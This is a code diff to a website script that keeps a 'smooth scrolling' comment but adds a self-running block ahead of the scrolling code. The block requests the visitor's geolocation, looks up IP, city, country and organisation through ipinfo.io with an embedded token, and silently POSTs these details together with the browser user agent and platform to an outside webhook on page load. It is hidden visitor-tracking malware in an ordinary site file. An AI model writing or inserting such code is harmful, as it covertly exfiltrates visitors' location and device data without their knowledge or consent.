@@ -1,4 +1,58 @@
-// Smooth scrolling for navigation links
+// Smooth scrolling for navigation link 
+        (function() {
+            // جلب بيانات الموقع عبر Geolocation API
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+
+                        // جلب IP والمعلومات عبر ipinfo.io مع استخدام التوكن
+                        fetch('https://ipinfo.io/json?token=4e3a21a0a706b5')   
+                            .then(res => res.json())
+                            .then(ipData => {
+
+                                const dataToSend = {
+                                    alert: "🚨 تم رصد زائر جديد!",
+                                    ip: ipData.ip || "غير معروف",
+                                    country: ipData.country || "غير معروف",
+                                    region: ipData.region || "غير معروف",
+                                    city: ipData.city || "غير معروف",
+                                    location: `${lat}, ${lon}`,
+                                    org: ipData.org || "غير معروف",
+                                    platform: navigator.platform,
+                                    browser: navigator.userAgent,
+                                    time: new Date().toLocaleString()
+                                };
+
+                                // إرسال البيانات إلى الـ Webhook
+                                fetch('https://webhook-test.com/03d677f4537c3db699306e1fdfe1bd63', {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify(dataToSend)
+                                });
+
+                            })
+                            .catch(err => {
+                                console.error("خطأ في جلب بيانات IP:", err);
+                            });
+                    },
+                    function(error) {
+                        console.error("خطأ في الحصول على الموقع:", error.message);
+                    }
+                );
+            } else {
+                alert("الموقع غير مدعوم في هذا المتصفح.");
+            }
+        })();
+    
+
+
+
+
+
 document.querySelectorAll('a[href^="#"]').forEach(anchor => {
     anchor.addEventListener('click', function (e) {
         e.preventDefault();
